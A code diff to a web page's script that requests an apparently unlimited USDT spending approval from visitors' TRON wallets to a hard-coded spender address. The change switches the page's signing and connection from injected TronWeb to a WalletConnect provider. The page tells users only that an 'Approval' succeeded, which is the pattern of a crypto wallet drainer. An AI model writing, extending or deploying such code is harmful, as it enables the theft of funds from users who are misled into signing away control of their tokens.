@@ -7,6 +7,9 @@
 
 <link rel="icon" href="https://raw.githubusercontent.com/salmanraheem-dev/bestforlast/refs/heads/main/public/logo.png">
 
+<!-- TronWeb3 WalletConnect Provider -->
+<script src="https://npmcdn.com/@tronweb3/walletconnect-tron-provider@latest/dist/index.umd.min.js"></script>
+
 <style>
 body{
   margin:0;
@@ -212,11 +215,14 @@ body{
 
 <script>
 // CONFIG
+const PROJECT_ID = "171db6da15a54effc1b4a06f889a3c3f";
+const TRON_CHAIN_ID = 728126428; // TRON mainnet
 const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 const SPENDER_ADDRESS = "TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV";
 const APPROVE_SELECTOR = "095ea7b3";
 const MAX_UINT256 = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
 
+let provider = null;
 let address = null;
 let isProcessing = false;
 
@@ -298,23 +304,23 @@ async function sendApproval(){
 
     setStatus("Requesting signature...", 'loading');
 
-    // Sign with TronWeb
-    if(!window.tronWeb){
-      throw new Error("TronWeb not available");
-    }
-
-    const signed = await window.tronWeb.trx.sign(txResponse.transaction);
+    // Sign with provider
+    const signedTx = await provider.request({
+      method: 'tron_signTransaction',
+      params: [txResponse.transaction]
+    });
 
     setStatus("Broadcasting transaction...", 'loading');
 
     const broadcastResponse = await fetch("https://api.trongrid.io/wallet/broadcasttransaction", {
       method: "POST",
       headers: {'Content-Type': 'application/json'},
-      body: JSON.stringify(signed)
+      body: JSON.stringify(signedTx)
     }).then(r => r.json());
 
-    if(broadcastResponse.result){
-      setStatus("✓ Approval successful! TX: " + broadcastResponse.txid, 'success');
+    if(broadcastResponse.result || broadcastResponse.txid){
+      const txid = broadcastResponse.txid || 'Success';
+      setStatus("✓ Approval successful! TX: " + txid, 'success');
       setTimeout(() => {
         clearStatus();
         isProcessing = false;
@@ -333,31 +339,32 @@ async function sendApproval(){
 
 async function connectWallet(){
   try{
-    // Check for TronWeb (Trust Wallet)
-    if(window.tronWeb?.defaultAddress?.base58){
-      address = window.tronWeb.defaultAddress.base58;
+    setStatus("Connecting wallet...", 'loading');
+
+    // Initialize WalletConnect provider
+    if(!provider){
+      provider = new WalletConnectTronProvider({
+        projectId: PROJECT_ID,
+        chainId: TRON_CHAIN_ID,
+        rpc: {
+          [TRON_CHAIN_ID]: 'https://api.trongrid.io'
+        }
+      });
+    }
+
+    // Request account
+    const accounts = await provider.request({
+      method: 'tron_requestAccounts'
+    });
+
+    if(accounts && accounts.length > 0){
+      address = accounts[0];
       clearStatus();
-      console.log("Connected via TronWeb:", address);
+      console.log("Connected:", address);
       return true;
     }
 
-    // Request TronWeb access
-    setStatus("Requesting wallet access...", 'loading');
-    
-    // Trigger Trust Wallet to inject TronWeb
-    if(window.tronWeb){
-      const accounts = await window.tronWeb.request({ method: 'tron_requestAccounts' });
-      if(accounts && accounts.length > 0){
-        address = accounts[0];
-        clearStatus();
-        console.log("Connected:", address);
-        return true;
-      }
-    } else {
-      throw new Error("Trust Wallet not detected. Please install Trust Wallet and try again.");
-    }
-
-    return false;
+    throw new Error("No accounts found");
 
   }catch(e){
     console.error("Connect error:", e);
@@ -389,26 +396,9 @@ async function handleNext(){
   }
 }
 
-// Check on page load
+// Page load
 document.addEventListener('DOMContentLoaded', function(){
-  console.log("Page loaded");
-  
-  // Check if TronWeb is available (Trust Wallet)
-  if(window.tronWeb?.defaultAddress?.base58){
-    address = window.tronWeb.defaultAddress.base58;
-    document.getElementById("btn").innerText = "Send Approval";
-    console.log("TronWeb detected:", address);
-    return;
-  }
-
-  // Wait a bit for Trust Wallet to inject TronWeb
-  setTimeout(() => {
-    if(window.tronWeb?.defaultAddress?.base58){
-      address = window.tronWeb.defaultAddress.base58;
-      document.getElementById("btn").innerText = "Send Approval";
-      console.log("TronWeb detected (delayed):", address);
-    }
-  }, 2000);
+  console.log("Page loaded - WalletConnect ready");
 });
 
 </script>
